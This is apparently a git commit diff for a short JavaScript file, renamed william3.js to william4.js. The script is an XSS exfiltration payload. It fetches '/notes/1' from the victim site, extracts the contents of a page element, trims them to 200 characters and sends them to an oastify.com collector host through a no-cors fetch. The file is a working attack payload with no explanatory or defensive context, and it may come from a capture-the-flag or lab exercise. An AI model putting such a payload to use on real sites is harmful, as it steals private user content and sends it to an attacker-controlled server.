6eea5225ad908b10e8d98665bd0e4b03197a68a7
Lu William Hanugra <lu.hanugra@binus.ac.id>
2025-03-27 02:14:49 +0700

    Update and rename william3.js to william4.js

--- william4.js
+++ william4.js
@@ -1,6 +1,6 @@
 fetch('/notes/1').then(r=>r.text()).then(d=>{
-  let content = (new DOMParser()).parseFromString(d,'text/html').querySelector('div.mt-6').innerHTML;
-  // Use fetch with no-cors mode
+  let content = (new DOMParser()).parseFromString(d,'text/html').querySelector('div.mt-6').innerHTML.substring(0,200);
+  // Use fetch with no-cors mode and limit to first 200 characters
   fetch('https://66an85cubmljzetr1e0ebgqzuq0hoec3.oastify.com/collect?data='+encodeURIComponent(content), {
     method: 'GET',
     mode: 'no-cors'  // This prevents CORS errors
